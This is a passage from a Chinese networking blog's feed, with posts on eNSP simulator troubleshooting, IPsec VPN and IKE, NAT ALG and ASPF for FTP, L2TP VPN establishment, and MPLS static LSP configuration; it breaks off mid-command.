        <content type="html"><![CDATA[<p><strong>先提一下：win7对ensp的兼容性比较好，出现问题后最简单的办法就是卸载干净，重启电脑后重新安装。极端办法就是重装系统。win10对ensp的兼容性不是很好，有的问题就算重装系统也无法解决，只有按照下面的方法解决一下了。</strong></p><ul><li><p>安装ensp要关闭windows自带的防火墙，并且杀毒软件之类的也不要安装（目前反馈360可以用）</p></li><li><p>win7 建议使用 virtualbox 5.0.26 或者 5.1.20</p></li><li><p>win10 1709版本使用ensp请使用 virtualbox 5.1.26， 其它版本请使用5.1.20</p></li><li><p><a href="http://support.huawei.com/huaweiconnect/enterprise/thread-287339.html">ensp使用CPU利用率过高解决办法</a></p></li><li><p><a href="https://www.zybuluo.com/handbye/note/923013">启动AR时，提示“can not find AR_Base”错误信息</a></p></li><li><p><a href="https://www.zybuluo.com/handbye/note/923018">交换机启动一直出现####号解决办法</a></p></li><li><p><a href="http://support.huawei.com/huaweiconnect/enterprise/thread-403485.html">Cloud无法获取网卡信息，winpcap安装失败问题解决方法</a></p></li><li><p><a href="https://www.zybuluo.com/handbye/note/923027">win7 ensp启动设备提示43错误解决办法</a></p></li><li><p><a href="http://support.huawei.com/huaweiconnect/enterprise/thread-412811.html">win10 1703系统无法启动多台设备解决方案</a></p></li></ul><blockquote><p>win 10 1703对esnp的兼容性非常差，建议不要升级到此版本。<br>已经安装了ensp的需要将之前的ensp，virtual box卸载干净，清除残留，重启电脑后重新安装。</p></blockquote><ul><li><p><a href="http://support.huawei.com/huaweiconnect/enterprise/thread-420849.html">win10专业版启动路由器提示40或者41错误</a></p></li><li><p><a href="http://pan.baidu.com/s/1pLFTf7P">win10 AR路由器启动40问题汇总</a></p></li><li><p><a href="http://support.huawei.com/huaweiconnect/enterprise/thread-421797.html">ensp程序中CE系列交换机只能启动两台，第三台一直显示########</a></p></li></ul><p> <strong>win10 1709 AR路由器开启提示40错误：</strong><br><a href="http://support.huawei.com/huaweiconnect/enterprise/thread-237361.html">http://support.huawei.com/huaweiconnect/enterprise/thread-237361.html</a><br><a href="http://support.huawei.com/huaweiconnect/enterprise/forum.php?mod=viewthread&tid=421339&extra=page=&page=1">http://support.huawei.com/huaweiconnect/enterprise/forum.php?mod=viewthread&amp;tid=421339&amp;extra=page%3D&amp;page=1</a></p>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ensp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ipsec vpn</title>
      <link href="2018/07/16/ipsec-vpn/"/>
      <url>2018/07/16/ipsec-vpn/</url>
      
        <content type="html"><![CDATA[<h3 id="ipsec-不是一个单独的协议，是一系列为ip网络提供安全性的协议和服务的集合"><a href="#ipsec-不是一个单独的协议，是一系列为ip网络提供安全性的协议和服务的集合" class="headerlink" title="ipsec 不是一个单独的协议，是一系列为ip网络提供安全性的协议和服务的集合"></a>ipsec 不是一个单独的协议，是一系列为ip网络提供安全性的协议和服务的集合</h3><p>ipsec能够为不安全的ip协议提供安全保证，包括：数据加密，数据完整性验证，防重放等。即便有人窃取了被ipsec加密过后的数据也无法解密。</p><p><strong>ipsec协议安全体系：</strong></p><p><img src="https://raw.githubusercontent.com/handbye/images/master/0110f2aaeeaebb676cd61805ef791e56.png" alt="0110f2aaeeaebb676cd61805ef791e56.png"></p><p>ipsec 通过两个安全协议实现ip报文的安全防护：</p><ul><li>AH（Authentication Header）:AH是报文头验证协议，主要提供数据源验证、数据完整性验证和防报文重放功能，不提供加密功能。</li><li>AH协议会验证整个ip报文，包括ip头，所以只能用来没有NAT穿越的场景下，并且AH不提供数据的加密功能，所以现在AH协议基本不用。</li><li>ESP（Encapsulating SecurityPayload）是封装安全载荷协议，主要提供加密、数据源验证、数据完整性验证和防报文重放功能。</li><li>ESP协议验证部分不包括IP头部，并且提供数据的加密功能，现在正在被广泛应用。</li></ul><h3 id="安全联盟（SA）"><a href="#安全联盟（SA）" class="headerlink" title="安全联盟（SA）"></a>安全联盟（SA）</h3><p>IPSec安全传输数据的前提是在IPSec对等体（即IPSec协议的两个端点）之间成功建立安全联盟SA（Security Association）。SA是通信的IPSec对等体间对某些要素的约定，例如：对等体间使用何种安全协议、需要保护的数据流特征、对等体间传输的数据的封装模式、协议采用的加密算法、验证算法，以及用于数据安全转换和传输的密钥以及SA的生存周期等。IPSec安全联盟简称IPSec SA。<br>SA由一个三元组来唯一标识，这个三元组包括安全参数索引SPI（Security Parameter Index）、目的IP地址和使用的安全协议号（AH或ESP）。其中，SPI是用于唯一标识SA的一个32比特数值，它在AH和ESP头中传输。在手工配置SA时，需要手工指定SPI的取值。使用IKE协商产生SA时，SPI将随机生成。<br>SA是单向的逻辑连接，因此两个IPSec对等体之间的双向通信，最少需要建立两个SA来分别对两个方向的数据流进行安全保护。<br>另外，SA的个数还与安全协议相关。如果您只使用AH或ESP来保护两个对等体之间的流量，则对等体之间就有两个SA，每个方向上一个。如果对等体同时使用了AH和ESP，那么对等体之间就需要四个SA，每个方向上两个，分别对应AH和ESP。</p><p><strong>有两种方式建立IPSec安全联盟：手工方式和IKE自动协商方式。二者的主要区别为</strong>：</p><ul><li>密钥生成方式不同<br>手工方式下，建立SA所需的全部参数，包括加密、验证密钥，都需要用户手工配置，也只能手工刷新，在中大型网络中，这种方式的密钥管理成本很高；IKE方式下，建立SA需要的加密、验证密钥是通过DH算法生成的，可以动态刷新，因而密钥管理成本低，且安全性较高。</li><li>生存周期不同<br>手工方式建立的SA，一经建立永久存在；IKE方式建立的SA，其生存周期由双方配置的生存周期参数控制。<br>因此，手工方式适用于对等体设备数量较少时，或是在小型网络中。对于中大型网络，推荐使用IKE自动协商建立SA。</li></ul><p>关于使用两种方式建立IPSEC SA 在华为设备上的配置对比请参考：<br><a href="https://www.zybuluo.com/handbye/note/961552">https://www.zybuluo.com/handbye/note/961552</a></p><h3 id="封装模式"><a href="#封装模式" class="headerlink" title="封装模式"></a>封装模式</h3><p>封装模式是指将AH或ESP相关的字段插入到原始IP报文中，以实现对报文的认证和加密，封装模式有传输模式和隧道模式两种。</p><ul><li>传输模式：AH头或ESP头被插入到IP头与传输层协议头之间，保护TCP/UDP/ICMP负载。传输模式不改变报文头，故隧道的源和目的地址必须与IP报文头中的源和目的地址一致，所以只适合两台主机或一台主机和一台VPN网关之间通信。（由于私网地址不能在公网进行路由）</li><li>隧道模式：AH头或ESP头被插到原始IP头之前，另外生成一个新的报文头放到AH头或ESP头之前，保护IP头和负载。隧道模式主要应用于两台VPN网关之间或一台主机与一台VPN网关之间的通信。（其实隧道模式可以应用在任何场景下）</li></ul><p><img src="https://raw.githubusercontent.com/handbye/images/master/48349e55ad9d1372c77495bc31711ab1.jpg" alt="48349e55ad9d1372c77495bc31711ab1.jpg"></p><h3 id="IKE（Internet-Key-Exchange）"><a href="#IKE（Internet-Key-Exchange）" class="headerlink" title="IKE（Internet Key Exchange）"></a>IKE（Internet Key Exchange）</h3><p>说了这么多，以上各种安全性的前提下（认证，加密）都必须建立在秘钥可以安全的共享的前提下。</p><p>有两种方法解决这个问题：</p><ul><li>带外共享密钥<br>在发送、接收设备上手工配置静态的加密、验证密钥。双方通过带外共享的方式（例如通过电话或邮件方式）保证密钥一致性。这种方式的缺点是可扩展性差，在点到多点组网中配置密钥的工作量成倍增加。另外，为提升网络安全性需要周期性修改密钥，这种方式下也很难实施。</li><li>使用一个安全的密钥分发协议<br>通过IKE协议自动协商密钥。IKE采用DH（Diffie-Hellman）算法在不安全的网络上安全地分发密钥。这种方式配置简单，可扩展性好，特别是在大型动态的网络环境下此优点更加突出。同时，通信双方通过交换密钥交换材料来计算共享的密钥，即使第三方截获了双方用于计算密钥的所有交换数据，也无法计算出真正的密钥。</li></ul><p>IKE是基于UDP（User DatagramProtocol）的应用层协议。它为IPSec提供了自动协商密钥、建立IPSec安全联盟的服务，能够简化IPSec的使用和管理，大大简化IPSec的配置和维护工作。</p><p><strong>IKE分为IKEV1和IKEV2两个版本：</strong><br>IKE协商IPSEC SA的大概过程如下：<br><img src="https://raw.githubusercontent.com/handbye/images/master/48e421b0b45dca47d2626fbd151885db.png" alt="48e421b0b45dca47d2626fbd151885db.png"></p><p>主模式下IKEv1采用3个步骤6条ISAKMP消息建立IKE SA<br><img src="http://blog.handbye.cn/up/180422/90eBFk6Hci.png?imageslim" alt="mark"><br>在阶段2中IKEv1采用快速交换模式通过3条ISAKMP消息建立IPSec SA。<br><img src="http://blog.handbye.cn/up/180422/I0aJGDl9ea.png?imageslim" alt="mark"></p><p>报文交互过程如下：<br><img src="https://raw.githubusercontent.com/handbye/images/master/4839799c934a3ed145bbf057f2bd1b11.jpg" alt="4839799c934a3ed145bbf057f2bd1b11.jpg"></p><p>野蛮模式只用了3条ISAKMP消息就完成了阶段1的协商过程，阶段2仍旧是快速模式不变。<br><img src="http://blog.handbye.cn/up/180422/ICF7BC9mKc.png" alt="mark"><br>报文如下：<br><img src="http://blog.handbye.cn/up/180422/mk69a86Bh4.png" alt="mark"></p><p>KEv1协商建立IPSec SA的时间太长<br>IKEv1主模式协商一对IPSec SA，需要6（协商IKE SA）+3（协商IPSec SA）=9条消息。<br>IKEv1野蛮模式协商一对IPSec SA，需要3（协商IKE SA）+3（协商IPSec SA）=6条消息。</p><p><strong>IKEv2相比IKEv1：</strong></p><ul><li>协商建立IPSec SA的速度大大提升，正常情况IKEv2协商一对IPSec SA只需要2（协商IKESA）+2（协商IPSecSA）=4条消息。后续每建立一对IPSec SA只会增加2条消息。</li><li>增加了EAP（Extensible Authentication Protocol）方式的身份认证。<br>IKEv2通过EAP协议解决了远程接入用户认证的问题，彻底摆脱了L2TP的牵制。目前IKEv2已经广泛应用于远程接入网络中了。<br><img src="http://blog.handbye.cn/up/180422/4eF28EGi76.png" alt="mark"></li></ul><p>报文交互如下：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/62475fe6264bb9bd84a5ede1830d8a02.png" alt="62475fe6264bb9bd84a5ede1830d8a02.png"></p><h3 id="数据经过ipsec隧道的转发过程"><a href="#数据经过ipsec隧道的转发过程" class="headerlink" title="数据经过ipsec隧道的转发过程"></a>数据经过ipsec隧道的转发过程</h3><p>1.形成IPSEC SA，建立隧道。<br>2.定义感兴趣数据流发送到Tunnel口，转发模块依据路由查询结果，将IP明文发送到IPsec虚拟隧道接口进行加封装：原始IP报文被AH/ESP封装在一个新的IP报文中，新IP头中的源地址和目的地址分别为隧道接口的源地址和目的地址。<br>3.ipsec对等体收到后转发模块识别到此IP密文的目的地为本设备的隧道接口地址且IP协议号为AH或ESP时，会将IP密文送到相应的IPsec虚拟隧道接口进行解封装：将IP密文的外层IP头去掉，对内层IP报文进行解密处理。</p><p><strong>具体工作过程如下：</strong></p><p><strong>1.概述</strong></p><p>IPsec虚拟隧道接口是一种支持路由的三层逻辑接口，它可以支持动态路由协议，所有路由到IPsec虚拟隧道接口的报文都将进行IPsec保护，同时还可以支持对组播流量的保护。使用IPsec虚拟隧道接口建立IPsec隧道具有以下优点：</p><p>(1) 简化配置：通过路由来确定对哪些数据流进行IPsec保护。与通过ACL指定数据流范围的方式相比，这种方式简化了用户在部署IPsec安全策略时配置上的复杂性，使得IPsec的配置不会受到网络规划的影响，增强了网络规划的可扩展性，降低了网络维护成本。<br>(2) 减少开销：在保护远程接入用户流量的组网应用中，在IPsec虚拟隧道接口处进行报文封装，与IPsec over GRE或者IPsec over L2TP方式的隧道封装相比，无需额外为入隧道流量加封装GRE头或者L2TP头，减少了报文封装的层次，节省了带宽。<br>(3) 业务应用更灵活：IPsec虚拟隧道接口在实施过程中明确地区分出“加密前”和“加密后”两个阶段，用户可以根据不同的组网需求灵活选择其它业务（例如NAT、QoS）实施的阶段。例如，如果用户希望对IPsec封装前的报文应用QoS，则可以在IPsec虚拟隧道接口上应用QoS策略；如果希望对IPsec封装后的报文应用QoS，则可以在物理接口上应用QoS策略。</p><p><strong>2.工作原理</strong></p><p>IPsec虚拟隧道接口对报文的加封装/解封装发生在隧道接口上。用户流量到达实施IPsec配置的设备后，需要IPsec处理的报文会被转发到IPsec虚拟隧道接口上进行加封装/解封装。</p><p><strong>IPsec虚拟隧道接口对报文进行加封装的过程如下：</strong><br><img src="http://www.h3c.com/cn/res/201004/22/20100422_960612_image002_624140_30003_0.png" alt="此处输入图片的描述"></p><p>(1) Router将从入接口接收到的IP明文送到转发模块进行处理；<br>(2)转发模块依据路由查询结果，将IP明文发送到IPsec虚拟隧道接口进行加封装：原始IP报文被封装在一个新的IP报文中，新IP头中的源地址和目的地址分别为隧道接口的源地址和目的地址。<br>(3)IPsec虚拟隧道接口完成对IP明文的加封装处理后，将IP密文送到转发模块进行处理；<br>(4)转发模块进行第二次路由查询后，将IP密文通过隧道接口的实际物理接口转发出去。</p><p><strong>IPsec虚拟隧道接口对报文进行解封装的过程如下：</strong></p><p><img src="http://www.h3c.com/cn/res/201004/22/20100422_960613_image003_624140_30003_0.png"></p><p>(1) Router将从入接口接收到的IP密文送到转发模块进行处理；<br>(2) 转发模块识别到此IP密文的目的地为本设备的隧道接口地址且IP协议号为AH或ESP时，会将IP密文送到相应的IPsec虚拟隧道接口进行解封装：将IP密文的外层IP头去掉，对内层IP报文进行解密处理。<br>(3) IPsec虚拟隧道接口完成对IP密文的解封装处理之后，将IP明文重新送回转发模块处理；<br>(4) 转发模块进行第二次路由查询后，将IP明文从隧道的实际物理接口转发出去。</p><blockquote><p>从上面描述的加封装/解封装过程可见，IPsec虚拟隧道接口将报文的IPsec处理过程区分为两个阶段：“加密前”和“加密后”。需要应用到加密前的明文上的业务（例如NAT、QoS），可以应用到隧道接口上；需要应用到加密后的密文上的业务，则可以应用到隧道接口对应的物理接口上</p></blockquote><p>参考文章：</p><ul><li><a href="http://www.h3c.com/cn/d_200812/624140_30003_0.htm#_Toc259032798">http://www.h3c.com/cn/d_200812/624140_30003_0.htm#_Toc259032798</a></li><li><a href="http://blog.51cto.com/sukhoi/1549430">http://blog.51cto.com/sukhoi/1549430</a></li><li><a href="http://blog.csdn.net/nanfeng1686/article/details/45741561">http://blog.csdn.net/nanfeng1686/article/details/45741561</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> VPN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vpn </tag>
            
            <tag> ipsec </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NAT alg 和 ASPF</title>
      <link href="2018/07/01/NAT-alg-ASPF/"/>
      <url>2018/07/01/NAT-alg-ASPF/</url>
      
        <content type="html"><![CDATA[<p>NAT的部署已经在企业网中必不可少，当防火墙作为网络的出口或者在网络中充当安全网关时，内网用户访问外网或者外网用户访问内网的服务器都要经过NAT穿越。</p><p>由于防火墙的特殊性，出于安全的考虑，需要建立相应的安全策略。当防火墙检测到这个数据包是一个首包时，就会根据相应的安全策略进行检查，符合安全策略就给通过并生成对应的会话表项。后续数据包到达是就无须在进行安全策略的检查，直接匹配会话表进行转发，这样就大大提高了转发效率。</p><h3 id="先上一张防火墙转发数据的流程图："><a href="#先上一张防火墙转发数据的流程图：" class="headerlink" title="先上一张防火墙转发数据的流程图："></a>先上一张防火墙转发数据的流程图：</h3><p><img src="https://raw.githubusercontent.com/handbye/images/master/05f1a93abe3a53a3f0b0d84903feb34b.png" alt="05f1a93abe3a53a3f0b0d84903feb34b.png"></p><blockquote><p>可以看到在生成会话表之前是先查NAT策略的，也就是查找玩NAT策略以后，再根据NAT生成会话表。</p></blockquote><p>比如下方的会话表：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">SIP  VPN: public --&gt; public  192.168.2.5:5060[1.1.1.1:2327] +-&gt; 221.181.108.137:5060<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>[] 中的就是NAT过后的IP地址</p><p>通常情况下，NAT只对报文中IP头部的地址信息和TCP/UDP头部的端口信息进行转换，不关注报文载荷的信息。但是对于一些特殊的协议（如FTP协议），其报文载荷中也携带了地址或端口信息，而报文载荷中的地址或端口信息往往是由通信的双方动态协商生产的，管理员并不能为其提前配置好相应的NAT规则。如果提供NAT功能的设备不能识别并转换这些信息，将会影响到这些协议的正常使用。</p><h3 id="下面以FTP报文为例说下为什么要启用NAT-alg-或者-ASPF"><a href="#下面以FTP报文为例说下为什么要启用NAT-alg-或者-ASPF" class="headerlink" title="下面以FTP报文为例说下为什么要启用NAT alg 或者 ASPF"></a>下面以FTP报文为例说下为什么要启用NAT alg 或者 ASPF</h3><p>FTP控制层面的连接报文，使用TCP端口号21</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/abf9792a205df368ed34f78ee70cfa16.png" alt="abf9792a205df368ed34f78ee70cfa16.png"></p><p>控制层面的TCP连接端口号是携带在头部的，是可以被NAT转换的。控制层面在有NAT的环境下是可以进行连接的。</p><p>控制层面连接完成之后，进行文件传送之前要建立数据层面的连接，这时会由client侧向server侧发送port消息，携带自己开放的数据层面连接端口号（主动模式下是这样的，FTP还有被动模式，这里就以主动模式来说）。报文如下：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/e118f606042e553053580b654483c0be-1024x165.png" alt="e118f606042e553053580b654483c0be-1024x165.png"></p><p>问题来了，数据层面的端口号是携带在报文载荷部分的，NAT只能转换头部信息，无法转换载荷信息。在存在NAT穿越的场景下，数据连接就无法建立，这时看到的情况就是能够登陆成功，但是无法显示服务器文件列表也不能上传和下载文件。</p><p><strong>这时就需要用到NAT alg功能来识别载荷部分的端口信息，来做对应的NAT转换。</strong></p><p>FTP协议包括两种工作模式：主动模式和被动模式。主动模式中，FTP Server主动向FTP Client发起数据连接；被动模式中，FTP Server被动接收FTP Client发起的数据连接。无论是主动模式还是被动模式，在控制连接交互报文的载荷中，都包含用于建立数据连接的IP地址和端口号信息。<br>如果在FTP Client和FTP Server之间部署了NAT设备，这就要求NAT设备必须能够识别出控制连接中包含的IP地址和端口号并进行处理，否则数据连接无法成功建立，FTP协议不能正常工作。</p><p>下面以FTP协议工作在主动模式为例，介绍NAT ALG功能对FTP协议的处理过程。</p><p>如图1所示，FTP Client位于私有网络，FTP Server位于公共网络。NGFW对FTP协议的报文处理过程如下：<br>1.FTP Client通过源NAT地址转换后可以访问FTP Server，与FTP Server完成FTP控制连接的TCP三次握手，并交付用户名和密码信息。<br>2.NGFW收到FTP Client发送的PORT命令报文后，将报文载荷字段中携带的私网地址和端口替换为公网地址和新的端口，然后发送至FTP Server。<br>3.NGFW收到FTP Server请求建立数据连接的报文后，替换报文的目的地址和目的端口为原始的地址和端口，然后发送至FTP Client。由此保证数据连接可以成功建立，FTP协议正常工作。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/bfe0881c604a7251db72ed5e9608e4e0.png" alt="bfe0881c604a7251db72ed5e9608e4e0.png"></p><h3 id="NAT-ALG与ASPF的关系"><a href="#NAT-ALG与ASPF的关系" class="headerlink" title="NAT ALG与ASPF的关系"></a>NAT ALG与ASPF的关系</h3><p><strong>差异点：</strong><br>开启ASPF功能的目的是识别多通道协议，并自动为其开放相应的安全策略。<br>开启NAT ALG功能的目的是识别多通道协议，并自动转换报文载荷中的IP地址和端口信息。<br><strong>共同点：</strong><br>二者使用相同的配置。开启其中一个功能，另一功能同时生效。</p><p>其实在防火墙上二者的配置命令是同一个，对于防火墙来说对二者是没区别的。因为NAT alg自动转换报文载荷中的ip地址和端口信息后，防火墙没有将其对应的安全策略放行，数据也是不能转发的。这一安全策略是基于防火墙的server-map表实现的。<br>关于server-map表的详解可以百度搜索serve-map表来了解一下。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> NAT </category>
          
      </categories>
      
      
        <tags>
            
            <tag> NATalg </tag>
            
            <tag> ASPF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>L2TP vpn</title>
      <link href="2018/06/26/L2TP-VPN/"/>
      <url>2018/06/26/L2TP-VPN/</url>
      
        <content type="html"><![CDATA[<h3 id="L2TP-VPN介绍"><a href="#L2TP-VPN介绍" class="headerlink" title="L2TP VPN介绍"></a>L2TP VPN介绍</h3><p>介绍了IPSECvpn，IPSECvpn主要用来两个站点之间的互联，比如公司总部和分部或者分部与分部之间。IPSECvpn建立后隧道会一直存在，用于站点之间的数据传输，并且IPSECvpn有很好的安全性。所以现在企业中很多的都在用IPSECvpn，对于企业不同地域之间的部门或者总分部之间，在用户感知来看就相当于在一个内网之中。但是IPSECvpn的建立需要在两个站点网络出口设备上进行配置，隧道建立之后，内网用户就可以进行通信了。显然对于那些出差的员工或者想要在家里办公的员工，ISPECvpn就不能满足了。 这时就需要L2TPvpn来满足这种移动用户可以随时与公司网络的出口设备建立L2TPvpn隧道，进而可以访问公司内网的资源。其实现在的SSLvpn也可以很好的满足这种需求，本篇本章重点介绍L2TPvpn,SSLvpn随后介绍。</p><h3 id="L2TP-VPN的几个概念"><a href="#L2TP-VPN的几个概念" class="headerlink" title="L2TP VPN的几个概念"></a>L2TP VPN的几个概念</h3><p>1.LAC：L2TP Access Concentrator，接入汇聚点，在传统的VPDN网络中也叫NAC（Network Access Server）。VPDN是一种基于PSTN/ISDN的VPN。关于VPDN的介绍，请看：<a href="https://wenku.baidu.com/view/1ec7af595727a5e9856a61f4.html">VPDN简介</a>。LAC一般部署在运行商网路，有的企业网络出口也会部署LAC。</p><p>2.LNS：L2TP Network Server，网络服务器，一般部署在企业网路中。LNS主要用来提供L2TP客户端拨号接入或者和LAC建立L2TP vpn。</p><p>3.PPP协议：L2tp顾名思义来说就是二层VPN，是一种将内层数据帧封装在而成协议中的技术。比如PPP,ATM,fram rely等。所以他可以支持多种网络类型。而现在运用的最多的二层成帧技术还要属PPP协议，它有众多优点：</p><ul><li>IP地址的动态分配和管理</li><li>同步或异步的物理层通信</li><li>链路的配置、质量检测和纠错</li><li>多种配置参数选项的协商</li><li>可以实现认证，计费等功能</li></ul><p>因此广泛应用在用户接入到ISP网络中，甚至以太网中也借用了这种协议，形成了PPPOE协议。<strong>L2TP是PPP的扩展，使PPP报文可以通过隧道方式在公网网络中传输。<br>如果组网中只应用PPP，则PPP终端发起的拨号，最远只能到达拨号网络的边缘节点NAS，此时NAS可以称为PPP会话的终止节点。而应用L2TP，则可以使PPP报文在公网透传，到达企业总部的LNS，此时LNS相当于PPP会话的终止节点</strong>。至于何时会用到PPP协议以及具体的协商过程随后介绍。<br>另外关于PPP协议的详细介绍见：<a href="http://blog.csdn.net/windeal3203/article/details/51066331">http://blog.csdn.net/windeal3203/article/details/51066331</a></p><h3 id="L2TP-VPN分类"><a href="#L2TP-VPN分类" class="headerlink" title="L2TP VPN分类"></a>L2TP VPN分类</h3><p><strong>L2TPvpn主要分为三类：</strong></p><p>1.L2TP Client-Initiated VPN<br>这种VPN是客户端（手机，电脑等移动设备）直接使用L2TP拨号软件或者系统自带的拨号软件拨号到LNS上与LNS建立L2TPvpn。<br>2.L2TP NAS-Initiated VPN<br>这种VPN是LAC和LNS配置了L2TPvpn的相关参数，当用户拨号到LAC上去访问公司内网数据时，会触发LAC与LNS建立L2TPvpn。<br>3.L2TP LAC-Auto-Initiated VPN<br>LAC-Auto-Initiated VPN 也叫做LAC 自动拨号VPN，顾名思义，在LAC 上配置完成后，LAC<br>会自动向LNS 发起拨号，建立L2TP 隧道和会话，不需要分支机构用户拨号来触发。对于分<br>支机构用户来说，访问总部网络就跟访问自己所在的分支机构网络一样，完全感觉不到自己<br>是在远程接入。</p><h3 id="L2TP-VPN建立过程"><a href="#L2TP-VPN建立过程" class="headerlink" title="L2TP VPN建立过程"></a>L2TP VPN建立过程</h3><h4 id="L2TP协议架构"><a href="#L2TP协议架构" class="headerlink" title="L2TP协议架构"></a>L2TP协议架构</h4><p>L2TP协议包含两种类型的消息，控制消息和数据消息，消息的传输在LAC和LNS之间进行。L2TP协议通过这两种消息，扩展了PPP的应用。<br><strong>控制消息</strong><br>用于L2TP隧道和会话连接的建立、维护和拆除。在控制消息的传输过程中，使用消息丢失重传和定时检测隧道连通性等机制来保证控制消息传输的可靠性，支持对控制消息的流量控制和拥塞控制。<br><strong>数据消息</strong><br>用于封装PPP数据帧并在隧道上传输。数据消息是不可靠的传输，不重传丢失的数据报文，不支持对数据消息的流量控制和拥塞控制。</p><h4 id="L2TP报文结构"><a href="#L2TP报文结构" class="headerlink" title="L2TP报文结构"></a>L2TP报文结构</h4><p><img src="https://i.loli.net/2017/12/27/5a435c876b720.png" alt="fig_dc_fd_l2tp_000603.png"></p><p><img src="https://i.loli.net/2017/12/27/5a436542f3556.png" alt="123.PNG"></p><p>L2TP报文进行了多次封装，比原始报文多出38个字节（如果需要携带序列号信息，则比原始报文多出42个字节），封装后报文的长度可能会超出接口的MTU值，而L2TP协议本身不支持报文分片功能，这时需要设备支持对IP报文的分片功能。当L2TP报文长度超出发送接口的MTU值时，在发送接口进行报文分片处理，接收端对收到分片报文进行还原，重组为L2TP报文。</p><p><strong>工作过程</strong></p><ul><li>VPDN连接在远程用户和LNS之间建立。ISP将距离远程用户地理位置最近的NAS部署为LAC，LAC和LNS之间建立L2TP隧道连接。</li><li>远程用户在电话网络中拨号，发起PPP连接到ISP部署的本地NAS。 NAS接入远程用户的呼叫，和远程用户进行PPP协商。</li><li>NAS作为LAC，根据远程用户拨号的用户名或者域，判断接入的用户是否为VPDN用户。如果接入用户是VPDN用户，则交由L2TP模块进行封装处理，将PPP报文通过L2TP隧道发送到LNS；如果不是VPDN用户，则正常处理和转发PPP报文。</li><li>LNS从L2TP隧道收到远程用户的接入请求，对远程用户认证后，为远程用户分配IP地址，通过隧道和LAC发送到远程用户。</li><li>远程用户获取IP地址，向总部主机发送报文进行通信。</li><li>LNS收到经由隧道传输的报文后，查找路由表，转发报文到内部目的主机。</li></ul><p>经过L2TP处理，远程用户使用拨号建立到LNS的点到点连接，其中LAC和Internet对用户透明。具体报文处理过程如下图，LAC和LNS均使用远程认证。（也可以采用本地认证）</p><p><img src="https://i.loli.net/2017/12/27/5a43622b962ea.png" alt="fig_dc_fd_l2tp_000702.png"></p><p> 1.远程用户PC发起呼叫连接请求到LAC。<br> 2.PC机和LAC进行PPP LCP协商。<br> 3.LAC对PC机提供的用户信息进行CHAP认证。<br> 4.LAC将用户信息（用户名和密码）发送给RADIUS服务器进行认证。<br> 5.RADIUS服务器认证通过则返回对该用户认证的结果。<br> 6.当LAC上指定LNS为域名时，LAC检查该LNS域名是否解析，如未解析则根据域名向DNS服务器请求解析对应的IP。如果LNS的IP地址解析成功，则触发建立隧道过程；否则用户上线失败。<br> 7.LAC和LNS之间建立L2TP隧道连接。<br> 8.LAC和LNS之间建立L2TP会话连接。<br> 9.LNS处理在会话连接中收到的PPP协商信息。<br> 10.LNS将接入请求信息发送给RADIUS服务器进行认证。<br> 11.RADIUS服务器认证通过则返回响应信息。如果RADIUS服务器上为该用户配置了Frame-IP、Frame-Route属性或者指定了地址池名称，响应报文中会携带该Frame-IP、Frame-Route或者指定的地址池名称。<br> 12.可选择是否对远程用户CHAP重认证，在LNS完成二次认证。<br> 13.LNS将二次认证信息发送给RADIUS服务器进行认证。<br> 14.RADIUS服务器认证通过则返回响应信息。<br> 15.LNS处理响应报文中携带的信息，保存分配给该用户的Frame-IP、Frame-Route或者指定的地址池名称。L2TP连接成功，为远程用户分配IP地址。<br> 16.远程用户和总部通信，LNS相当于远程用户的网关。</p><blockquote><p>选择执行步骤12时，需要执行步骤13和14，否则不需要执行。如果是L2TP Client-Initiated VPN的方式则省略前三步。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> VPN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> L2TPvpn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mpls Lsp的建立</title>
      <link href="2018/06/22/mpls-Lsp-create/"/>
      <url>2018/06/22/mpls-Lsp-create/</url>
      
        <content type="html"><![CDATA[<h2 id="mpls-lsp的建立"><a href="#mpls-lsp的建立" class="headerlink" title="mpls lsp的建立"></a>mpls lsp的建立</h2><p>介绍完了mpls基础部分，想必大家对mpls应该有了初步的了解。mpls中最重要的一个元素就是标签，因为mpls就是靠标签来完成数据报文的转发的。怎么为一个FEC来分配标签呢，有两种方法:静态（手工）分配标签，动态分配标签。</p><h2 id="静态分配标签"><a href="#静态分配标签" class="headerlink" title="静态分配标签"></a>静态分配标签</h2><p>手工分配标签的方式比较简单，通过人为的方法为一个FEC来指定标签，标签指定完后之后建立静态LSP，数据报文到达后按照标签来进行转发。手工分配标签的时候有一个原则:<strong>上游节点的出标签为下游节点的入标签</strong> 。<br>静态LSP不使用标签发布协议，不需要交互控制报文，资源消耗比较小，但通过静态方式建立的LSP不能根据网络拓扑变化动态调整，需要管理员干预。手动分配标签的方法适用于网络结构清晰，规模较小，网络结构稳定的环境下。</p><p>注意：静态LSP的配置需要区分ingress transit engress。</p><h3 id="配置方法如下："><a href="#配置方法如下：" class="headerlink" title="配置方法如下："></a>配置方法如下：</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">static-lsp ingress lsp-name destination ip-address &#123; mask-length | mask &#125; &#123; nexthop next-hop-address | outgoing-interface interface-type interface-number &#125; * out-label out-label<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>配置本节点为指定LSP的Ingress。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">static-lsp transit lsp-name [ incoming-interface interface-type interface-number ] in-label in-label &#123; nexthop next-hop-address | outgoing-interface interface-type interface-number &#125; * out-label out-label<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>配置本节点为指定LSP的Transit。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">static-lsp egress lsp-name [ incoming-interface interface-type interface-number ] 